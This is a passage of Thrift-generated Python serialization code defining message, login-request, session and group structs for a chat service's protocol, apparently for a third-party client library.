    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('Group')
        if self.id is not None:
            oprot.writeFieldBegin('id', TType.STRING, 1)
            oprot.writeString(self.id.encode('utf-8') if sys.version_info[0] == 2 else self.id)
            oprot.writeFieldEnd()
        if self.createdTime is not None:
            oprot.writeFieldBegin('createdTime', TType.I64, 2)
            oprot.writeI64(self.createdTime)
            oprot.writeFieldEnd()
        if self.name is not None:
            oprot.writeFieldBegin('name', TType.STRING, 10)
            oprot.writeString(self.name.encode('utf-8') if sys.version_info[0] == 2 else self.name)
            oprot.writeFieldEnd()
        if self.pictureStatus is not None:
            oprot.writeFieldBegin('pictureStatus', TType.STRING, 11)
            oprot.writeString(self.pictureStatus.encode('utf-8') if sys.version_info[0] == 2 else self.pictureStatus)
            oprot.writeFieldEnd()
        if self.preventedJoinByTicket is not None:
            oprot.writeFieldBegin('preventedJoinByTicket', TType.BOOL, 12)
            oprot.writeBool(self.preventedJoinByTicket)
            oprot.writeFieldEnd()
        if self.groupPreference is not None:
            oprot.writeFieldBegin('groupPreference', TType.STRUCT, 13)
            self.groupPreference.write(oprot)
            oprot.writeFieldEnd()
        if self.members is not None:
            oprot.writeFieldBegin('members', TType.LIST, 20)
            oprot.writeListBegin(TType.STRUCT, len(self.members))
            for iter12 in self.members:
                iter12.write(oprot)
            oprot.writeListEnd()
            oprot.writeFieldEnd()
        if self.creator is not None:
            oprot.writeFieldBegin('creator', TType.STRUCT, 21)
            self.creator.write(oprot)
            oprot.writeFieldEnd()
        if self.invitee is not None:
            oprot.writeFieldBegin('invitee', TType.LIST, 22)
            oprot.writeListBegin(TType.STRUCT, len(self.invitee))
            for iter13 in self.invitee:
                iter13.write(oprot)
            oprot.writeListEnd()
            oprot.writeFieldEnd()
        if self.notificationDisabled is not None:
            oprot.writeFieldBegin('notificationDisabled', TType.BOOL, 31)
            oprot.writeBool(self.notificationDisabled)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class AuthQrcode(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRING, 'qrcode', 'UTF8', None, ),  # 1
        (2, TType.STRING, 'verifier', 'UTF8', None, ),  # 2
        (3, TType.STRING, 'callbackUrl', 'UTF8', None, ),  # 3
    )

    def __init__(self, qrcode=None, verifier=None, callbackUrl=None,):
        self.qrcode = qrcode
        self.verifier = verifier
        self.callbackUrl = callbackUrl

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRING:
                    self.qrcode = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRING:
                    self.verifier = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.STRING:
                    self.callbackUrl = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('AuthQrcode')
        if self.qrcode is not None:
            oprot.writeFieldBegin('qrcode', TType.STRING, 1)
            oprot.writeString(self.qrcode.encode('utf-8') if sys.version_info[0] == 2 else self.qrcode)
            oprot.writeFieldEnd()
        if self.verifier is not None:
            oprot.writeFieldBegin('verifier', TType.STRING, 2)
            oprot.writeString(self.verifier.encode('utf-8') if sys.version_info[0] == 2 else self.verifier)
            oprot.writeFieldEnd()
        if self.callbackUrl is not None:
            oprot.writeFieldBegin('callbackUrl', TType.STRING, 3)
            oprot.writeString(self.callbackUrl.encode('utf-8') if sys.version_info[0] == 2 else self.callbackUrl)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class LoginSession(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRING, 'tokenKey', 'UTF8', None, ),  # 1
        None,  # 2
        (3, TType.I64, 'expirationTime', None, None, ),  # 3
        None,  # 4
        None,  # 5
        None,  # 6
        None,  # 7
        None,  # 8
        None,  # 9
        None,  # 10
        (11, TType.I32, 'applicationType', None, None, ),  # 11
        (12, TType.STRING, 'systemName', 'UTF8', None, ),  # 12
        None,  # 13
        None,  # 14
        None,  # 15
        None,  # 16
        None,  # 17
        None,  # 18
        None,  # 19
        None,  # 20
        None,  # 21
        (22, TType.STRING, 'accessLocation', 'UTF8', None, ),  # 22
    )

    def __init__(self, tokenKey=None, expirationTime=None, applicationType=None, systemName=None, accessLocation=None,):
        self.tokenKey = tokenKey
        self.expirationTime = expirationTime
        self.applicationType = applicationType
        self.systemName = systemName
        self.accessLocation = accessLocation

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRING:
                    self.tokenKey = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.I64:
                    self.expirationTime = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 11:
                if ftype == TType.I32:
                    self.applicationType = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 12:
                if ftype == TType.STRING:
                    self.systemName = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 22:
                if ftype == TType.STRING:
                    self.accessLocation = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('LoginSession')
        if self.tokenKey is not None:
            oprot.writeFieldBegin('tokenKey', TType.STRING, 1)
            oprot.writeString(self.tokenKey.encode('utf-8') if sys.version_info[0] == 2 else self.tokenKey)
            oprot.writeFieldEnd()
        if self.expirationTime is not None:
            oprot.writeFieldBegin('expirationTime', TType.I64, 3)
            oprot.writeI64(self.expirationTime)
            oprot.writeFieldEnd()
        if self.applicationType is not None:
            oprot.writeFieldBegin('applicationType', TType.I32, 11)
            oprot.writeI32(self.applicationType)
            oprot.writeFieldEnd()
        if self.systemName is not None:
            oprot.writeFieldBegin('systemName', TType.STRING, 12)
            oprot.writeString(self.systemName.encode('utf-8') if sys.version_info[0] == 2 else self.systemName)
            oprot.writeFieldEnd()
        if self.accessLocation is not None:
            oprot.writeFieldBegin('accessLocation', TType.STRING, 22)
            oprot.writeString(self.accessLocation.encode('utf-8') if sys.version_info[0] == 2 else self.accessLocation)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class Message(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRING, '_from', 'UTF8', None, ),  # 1
        (2, TType.STRING, 'to', 'UTF8', None, ),  # 2
        (3, TType.I32, 'toType', None, None, ),  # 3
        (4, TType.STRING, 'id', 'UTF8', None, ),  # 4
        (5, TType.I64, 'createdTime', None, None, ),  # 5
        (6, TType.I64, 'deliveredTime', None, None, ),  # 6
        None,  # 7
        None,  # 8
        None,  # 9
        (10, TType.STRING, 'text', 'UTF8', None, ),  # 10
        (11, TType.STRUCT, 'location', [Location, None], None, ),  # 11
        None,  # 12
        None,  # 13
        (14, TType.BOOL, 'hasContent', None, None, ),  # 14
        (15, TType.I32, 'contentType', None, None, ),  # 15
        None,  # 16
        (17, TType.STRING, 'contentPreview', 'BINARY', None, ),  # 17
        (18, TType.MAP, 'contentMetadata', (TType.STRING, 'UTF8', TType.STRING, 'UTF8', False), None, ),  # 18
        (19, TType.I64, 'sessionId', None, None, ),  # 19
        (20, TType.LIST, 'chunks', (TType.STRING, 'UTF8', False), None, ),  # 20
        (21, TType.STRING, 'relatedMessageId', 'UTF8', None, ),  # 21
        (22, TType.I64, 'messageRelationType', None, None, ),  # 22
        (23, TType.I64, 'readCount', None, None, ),  # 23
        (24, TType.I64, 'relatedMessageServiceCode', None, None, ),  # 24
    )

    def __init__(self, _from=None, to=None, toType=None, id=None, createdTime=None, deliveredTime=None, text=None, location=None, hasContent=None, contentType=None, contentPreview=None, contentMetadata=None, sessionId=None, chunks=None, relatedMessageId=None, messageRelationType=None, readCount=None, relatedMessageServiceCode=None,):
        self._from = _from
        self.to = to
        self.toType = toType
        self.id = id
        self.createdTime = createdTime
        self.deliveredTime = deliveredTime
        self.text = text
        self.location = location
        self.hasContent = hasContent
        self.contentType = contentType
        self.contentPreview = contentPreview
        self.contentMetadata = contentMetadata
        self.sessionId = sessionId
        self.chunks = chunks
        self.relatedMessageId = relatedMessageId
        self.messageRelationType = messageRelationType
        self.readCount = readCount
        self.relatedMessageServiceCode = relatedMessageServiceCode

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRING:
                    self._from = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRING:
                    self.to = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.I32:
                    self.toType = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 4:
                if ftype == TType.STRING:
                    self.id = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 5:
                if ftype == TType.I64:
                    self.createdTime = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 6:
                if ftype == TType.I64:
                    self.deliveredTime = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 10:
                if ftype == TType.STRING:
                    self.text = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 11:
                if ftype == TType.STRUCT:
                    self.location = Location()
                    self.location.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 14:
                if ftype == TType.BOOL:
                    self.hasContent = iprot.readBool()
                else:
                    iprot.skip(ftype)
            elif fid == 15:
                if ftype == TType.I32:
                    self.contentType = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 17:
                if ftype == TType.STRING:
                    self.contentPreview = iprot.readBinary()
                else:
                    iprot.skip(ftype)
            elif fid == 18:
                if ftype == TType.MAP:
                    self.contentMetadata = {}
                    (_ktype15, _vtype16, _size14) = iprot.readMapBegin()
                    for _i18 in range(_size14):
                        _key19 = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                        _val20 = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                        self.contentMetadata[_key19] = _val20
                    iprot.readMapEnd()
                else:
                    iprot.skip(ftype)
            elif fid == 19:
                if ftype == TType.I64:
                    self.sessionId = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 20:
                if ftype == TType.LIST:
                    self.chunks = []
                    (_etype24, _size21) = iprot.readListBegin()
                    for _i25 in range(_size21):
                        _elem26 = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                        self.chunks.append(_elem26)
                    iprot.readListEnd()
                else:
                    iprot.skip(ftype)
            elif fid == 21:
                if ftype == TType.STRING:
                    self.relatedMessageId = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 22:
                if ftype == TType.I64:
                    self.messageRelationType = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 23:
                if ftype == TType.I64:
                    self.readCount = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 24:
                if ftype == TType.I64:
                    self.relatedMessageServiceCode = iprot.readI64()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('Message')
        if self._from is not None:
            oprot.writeFieldBegin('_from', TType.STRING, 1)
            oprot.writeString(self._from.encode('utf-8') if sys.version_info[0] == 2 else self._from)
            oprot.writeFieldEnd()
        if self.to is not None:
            oprot.writeFieldBegin('to', TType.STRING, 2)
            oprot.writeString(self.to.encode('utf-8') if sys.version_info[0] == 2 else self.to)
            oprot.writeFieldEnd()
        if self.toType is not None:
            oprot.writeFieldBegin('toType', TType.I32, 3)
            oprot.writeI32(self.toType)
            oprot.writeFieldEnd()
        if self.id is not None:
            oprot.writeFieldBegin('id', TType.STRING, 4)
            oprot.writeString(self.id.encode('utf-8') if sys.version_info[0] == 2 else self.id)
            oprot.writeFieldEnd()
        if self.createdTime is not None:
            oprot.writeFieldBegin('createdTime', TType.I64, 5)
            oprot.writeI64(self.createdTime)
            oprot.writeFieldEnd()
        if self.deliveredTime is not None:
            oprot.writeFieldBegin('deliveredTime', TType.I64, 6)
            oprot.writeI64(self.deliveredTime)
            oprot.writeFieldEnd()
        if self.text is not None:
            oprot.writeFieldBegin('text', TType.STRING, 10)
            oprot.writeString(self.text.encode('utf-8') if sys.version_info[0] == 2 else self.text)
            oprot.writeFieldEnd()
        if self.location is not None:
            oprot.writeFieldBegin('location', TType.STRUCT, 11)
            self.location.write(oprot)
            oprot.writeFieldEnd()
        if self.hasContent is not None:
            oprot.writeFieldBegin('hasContent', TType.BOOL, 14)
            oprot.writeBool(self.hasContent)
            oprot.writeFieldEnd()
        if self.contentType is not None:
            oprot.writeFieldBegin('contentType', TType.I32, 15)
            oprot.writeI32(self.contentType)
            oprot.writeFieldEnd()
        if self.contentPreview is not None:
            oprot.writeFieldBegin('contentPreview', TType.STRING, 17)
            oprot.writeBinary(self.contentPreview)
            oprot.writeFieldEnd()
        if self.contentMetadata is not None:
            oprot.writeFieldBegin('contentMetadata', TType.MAP, 18)
            oprot.writeMapBegin(TType.STRING, TType.STRING, len(self.contentMetadata))
            for kiter27, viter28 in self.contentMetadata.items():
                oprot.writeString(kiter27.encode('utf-8') if sys.version_info[0] == 2 else kiter27)
                oprot.writeString(viter28.encode('utf-8') if sys.version_info[0] == 2 else viter28)
            oprot.writeMapEnd()
            oprot.writeFieldEnd()
        if self.sessionId is not None:
            oprot.writeFieldBegin('sessionId', TType.I64, 19)
            oprot.writeI64(self.sessionId)
            oprot.writeFieldEnd()
        if self.chunks is not None:
            oprot.writeFieldBegin('chunks', TType.LIST, 20)
            oprot.writeListBegin(TType.STRING, len(self.chunks))
            for iter29 in self.chunks:
                oprot.writeString(iter29.encode('utf-8') if sys.version_info[0] == 2 else iter29)
            oprot.writeListEnd()
            oprot.writeFieldEnd()
        if self.relatedMessageId is not None:
            oprot.writeFieldBegin('relatedMessageId', TType.STRING, 21)
            oprot.writeString(self.relatedMessageId.encode('utf-8') if sys.version_info[0] == 2 else self.relatedMessageId)
            oprot.writeFieldEnd()
        if self.messageRelationType is not None:
            oprot.writeFieldBegin('messageRelationType', TType.I64, 22)
            oprot.writeI64(self.messageRelationType)
            oprot.writeFieldEnd()
        if self.readCount is not None:
            oprot.writeFieldBegin('readCount', TType.I64, 23)
            oprot.writeI64(self.readCount)
            oprot.writeFieldEnd()
        if self.relatedMessageServiceCode is not None:
            oprot.writeFieldBegin('relatedMessageServiceCode', TType.I64, 24)
            oprot.writeI64(self.relatedMessageServiceCode)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class MessageOperation(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.I64, 'revision', None, None, ),  # 1
        (2, TType.I64, 'createdTime', None, None, ),  # 2
        (3, TType.I32, 'type', None, None, ),  # 3
        (4, TType.I32, 'reqSeq', None, None, ),  # 4
        (5, TType.I32, 'status', None, None, ),  # 5
        None,  # 6
        None,  # 7
        None,  # 8
        None,  # 9
        (10, TType.STRING, 'param1', 'UTF8', None, ),  # 10
        (11, TType.STRING, 'param2', 'UTF8', None, ),  # 11
        (12, TType.STRING, 'param3', 'UTF8', None, ),  # 12
        None,  # 13
        None,  # 14
        None,  # 15
        None,  # 16
        None,  # 17
        None,  # 18
        None,  # 19
        (20, TType.STRUCT, 'message', [Message, None], None, ),  # 20
    )

    def __init__(self, revision=None, createdTime=None, type=None, reqSeq=None, status=None, param1=None, param2=None, param3=None, message=None,):
        self.revision = revision
        self.createdTime = createdTime
        self.type = type
        self.reqSeq = reqSeq
        self.status = status
        self.param1 = param1
        self.param2 = param2
        self.param3 = param3
        self.message = message

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.I64:
                    self.revision = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.I64:
                    self.createdTime = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.I32:
                    self.type = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 4:
                if ftype == TType.I32:
                    self.reqSeq = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 5:
                if ftype == TType.I32:
                    self.status = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 10:
                if ftype == TType.STRING:
                    self.param1 = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 11:
                if ftype == TType.STRING:
                    self.param2 = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 12:
                if ftype == TType.STRING:
                    self.param3 = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 20:
                if ftype == TType.STRUCT:
                    self.message = Message()
                    self.message.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('MessageOperation')
        if self.revision is not None:
            oprot.writeFieldBegin('revision', TType.I64, 1)
            oprot.writeI64(self.revision)
            oprot.writeFieldEnd()
        if self.createdTime is not None:
            oprot.writeFieldBegin('createdTime', TType.I64, 2)
            oprot.writeI64(self.createdTime)
            oprot.writeFieldEnd()
        if self.type is not None:
            oprot.writeFieldBegin('type', TType.I32, 3)
            oprot.writeI32(self.type)
            oprot.writeFieldEnd()
        if self.reqSeq is not None:
            oprot.writeFieldBegin('reqSeq', TType.I32, 4)
            oprot.writeI32(self.reqSeq)
            oprot.writeFieldEnd()
        if self.status is not None:
            oprot.writeFieldBegin('status', TType.I32, 5)
            oprot.writeI32(self.status)
            oprot.writeFieldEnd()
        if self.param1 is not None:
            oprot.writeFieldBegin('param1', TType.STRING, 10)
            oprot.writeString(self.param1.encode('utf-8') if sys.version_info[0] == 2 else self.param1)
            oprot.writeFieldEnd()
        if self.param2 is not None:
            oprot.writeFieldBegin('param2', TType.STRING, 11)
            oprot.writeString(self.param2.encode('utf-8') if sys.version_info[0] == 2 else self.param2)
            oprot.writeFieldEnd()
        if self.param3 is not None:
            oprot.writeFieldBegin('param3', TType.STRING, 12)
            oprot.writeString(self.param3.encode('utf-8') if sys.version_info[0] == 2 else self.param3)
            oprot.writeFieldEnd()
        if self.message is not None:
            oprot.writeFieldBegin('message', TType.STRUCT, 20)
            self.message.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class LoginRequest(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.I32, 'type', None, None, ),  # 1
        (2, TType.I32, 'identityProvider', None, None, ),  # 2
        (3, TType.STRING, 'identifier', 'UTF8', None, ),  # 3
        (4, TType.STRING, 'password', 'UTF8', None, ),  # 4
        (5, TType.BOOL, 'keepLoggedIn', None, None, ),  # 5
        (6, TType.STRING, 'accessLocation', 'UTF8', None, ),  # 6
        (7, TType.STRING, 'systemName', 'UTF8', None, ),  # 7
        (8, TType.STRING, 'certificate', 'UTF8', None, ),  # 8
        (9, TType.STRING, 'verifier', 'UTF8', None, ),  # 9
        (10, TType.STRING, 'secret', 'UTF8', None, ),  # 10
        (11, TType.I32, 'e2eeVersion', None, None, ),  # 11
    )

    def __init__(self, type=None, identityProvider=None, identifier=None, password=None, keepLoggedIn=None, accessLocation=None, systemName=None, certificate=None, verifier=None, secret=None, e2eeVersion=None,):
        self.type = type
        self.identityProvider = identityProvider
        self.identifier = identifier
        self.password = password
        self.keepLoggedIn = keepLoggedIn
        self.accessLocation = accessLocation
        self.systemName = systemName
        self.certificate = certificate
        self.verifier = verifier
        self.secret = secret
        self.e2eeVersion = e2eeVersion

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.I32:
                    self.type = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.I32:
                    self.identityProvider = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.STRING:
                    self.identifier = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 4:
                if ftype == TType.STRING:
                    self.password = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 5:
                if ftype == TType.BOOL:
                    self.keepLoggedIn = iprot.readBool()
                else:
                    iprot.skip(ftype)
            elif fid == 6:
                if ftype == TType.STRING:
                    self.accessLocation = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 7:
                if ftype == TType.STRING:
                    self.systemName = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 8:
                if ftype == TType.STRING:
                    self.certificate = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 9:
                if ftype == TType.STRING:
                    self.verifier = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 10:
                if ftype == TType.STRING:
                    self.secret = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 11:
                if ftype == TType.I32:
                    self.e2eeVersion = iprot.readI32()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('loginRequest')
        if self.type is not None:
            oprot.writeFieldBegin('type', TType.I32, 1)
            oprot.writeI32(self.type)
            oprot.writeFieldEnd()
        if self.identityProvider is not None:
            oprot.writeFieldBegin('identityProvider', TType.I32, 2)
            oprot.writeI32(self.identityProvider)
            oprot.writeFieldEnd()
        if self.identifier is not None:
            oprot.writeFieldBegin('identifier', TType.STRING, 3)
            oprot.writeString(self.identifier.encode('utf-8') if sys.version_info[0] == 2 else self.identifier)
            oprot.writeFieldEnd()
        if self.password is not None:
            oprot.writeFieldBegin('password', TType.STRING, 4)
            oprot.writeString(self.password.encode('utf-8') if sys.version_info[0] == 2 else self.password)
            oprot.writeFieldEnd()
        if self.keepLoggedIn is not None:
            oprot.writeFieldBegin('keepLoggedIn', TType.BOOL, 5)
            oprot.writeBool(self.keepLoggedIn)
            oprot.writeFieldEnd()
        if self.accessLocation is not None:
            oprot.writeFieldBegin('accessLocation', TType.STRING, 6)
            oprot.writeString(self.accessLocation.encode('utf-8') if sys.version_info[0] == 2 else self.accessLocation)
            oprot.writeFieldEnd()
        if self.systemName is not None:
            oprot.writeFieldBegin('systemName', TType.STRING, 7)
            oprot.writeString(self.systemName.encode('utf-8') if sys.version_info[0] == 2 else self.systemName)
            oprot.writeFieldEnd()
        if self.certificate is not None:
            oprot.writeFieldBegin('certificate', TType.STRING, 8)
            oprot.writeString(self.certificate.encode('utf-8') if sys.version_info[0] == 2 else self.certificate)
            oprot.writeFieldEnd()
        if self.verifier is not None:
            oprot.writeFieldBegin('verifier', TType.STRING, 9)
            oprot.writeString(self.verifier.encode('utf-8') if sys.version_info[0] == 2 else self.verifier)
            oprot.writeFieldEnd()
        if self.secret is not None:
            oprot.writeFieldBegin('secret', TType.STRING, 10)
            oprot.writeString(self.secret.encode('utf-8') if sys.version_info[0] == 2 else self.secret)
            oprot.writeFieldEnd()
        if self.e2eeVersion is not None:
            oprot.writeFieldBegin('e2eeVersion', TType.I32, 11)
            oprot.writeI32(self.e2eeVersion)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()
        
class MessageOperations(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.LIST, 'operations', (TType.STRUCT, [MessageOperation, None], False), None, ),  # 1
        (2, TType.BOOL, 'endFlag', None, None, ),  # 2
    )

    def __init__(self, operations=None, endFlag=None,):
        self.operations = operations
        self.endFlag = endFlag

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.LIST:
                    self.operations = []
                    (_etype33, _size30) = iprot.readListBegin()
                    for _i34 in range(_size30):
                        _elem35 = MessageOperation()
                        _elem35.read(iprot)
                        self.operations.append(_elem35)
                    iprot.readListEnd()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.BOOL:
                    self.endFlag = iprot.readBool()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('MessageOperations')
        if self.operations is not None:
            oprot.writeFieldBegin('operations', TType.LIST, 1)
            oprot.writeListBegin(TType.STRUCT, len(self.operations))
            for iter36 in self.operations:
                iter36.write(oprot)
            oprot.writeListEnd()
            oprot.writeFieldEnd()
        if self.endFlag is not None:
            oprot.writeFieldBegin('endFlag', TType.BOOL, 2)
            oprot.writeBool(self.endFlag)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class Operation(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.I64, 'revision', None, None, ),  # 1
        (2, TType.I64, 'createdTime', None, None, ),  # 2
        (3, TType.I32, 'type', None, None, ),  # 3
        (4, TType.I32, 'reqSeq', None, None, ),  # 4
        (5, TType.STRING, 'checksum', 'UTF8', None, ),  # 5
        None,  # 6
        (7, TType.I32, 'status', None, None, ),  # 7
        None,  # 8
        None,  # 9
        (10, TType.STRING, 'param1', 'UTF8', None, ),  # 10
        (11, TType.STRING, 'param2', 'UTF8', None, ),  # 11
        (12, TType.STRING, 'param3', 'UTF8', None, ),  # 12
        None,  # 13
        None,  # 14
        None,  # 15
        None,  # 16
        None,  # 17
        None,  # 18
        None,  # 19
        (20, TType.STRUCT, 'message', [Message, None], None, ),  # 20
    )

    def __init__(self, revision=None, createdTime=None, type=None, reqSeq=None, checksum=None, status=None, param1=None, param2=None, param3=None, message=None,):
        self.revision = revision
        self.createdTime = createdTime
        self.type = type
        self.reqSeq = reqSeq
        self.checksum = checksum
        self.status = status
        self.param1 = param1
        self.param2 = param2
        self.param3 = param3
        self.message = message

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.I64:
                    self.revision = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.I64:
                    self.createdTime = iprot.readI64()
                else:
                    iprot.skip(ftype)
